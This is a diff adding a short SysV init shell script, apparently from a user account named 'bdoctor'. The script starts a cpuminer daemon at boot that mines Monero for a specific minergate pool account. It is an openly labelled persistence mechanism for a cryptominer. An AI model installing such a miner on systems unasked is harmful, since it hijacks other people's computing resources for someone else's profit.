@@ -1,0 +1,52 @@
+#! /bin/sh
+# bdoctor
+### BEGIN INIT INFO
+# Provides:          miner
+# Required-Start:
+# Required-Stop:
+# Default-Start: 3 5
+# Default-Stop:
+# Short-Description: start mining
+# Description:
+### END INIT INFO
+
+PATH=/sbin:/usr/sbin:/bin:/usr/bin
+
+CCMINER_HOME=/home/bdoctor/cpuminer
+CCMINER=$CCMINER_HOME/minerd
+CCMINER_ARGS="-o stratum+tcp://xmr.pool.minergate.com:45560 -u minergate@ps-ax.com -p x -S"
+CCMINER_LOG="/tmp/cpuminer.log"
+
+PIDFILE=/var/run/cpuminer.pid
+
+
+. /lib/lsb/init-functions
+
+do_stop () {
+	log_action_msg "Stopping miner"
+	kill -TERM `ps ax|grep $CCMINER|grep -v grep|awk '{print $1}'`
+	exit
+}
+
+do_start () {
+	log_action_msg "Starting miner"
+	echo "$CCMINER -c $CCMINERCONF $CCMINER_ARGS >& $CCMINER_LOG"
+	start_daemon -p $PIDFILE $CCMINER $CCMINER_ARGS &
+}
+
+case "$1" in
+  start)
+	do_start
+	;;
+  stop)
+	do_stop
+	;;
+  status)
+	ps ax|grep $CCMINER
+	exit 0
+	;;
+  *)
+	echo "Usage: $0 start|stop" >&2
+	exit 3
+	;;
+esac
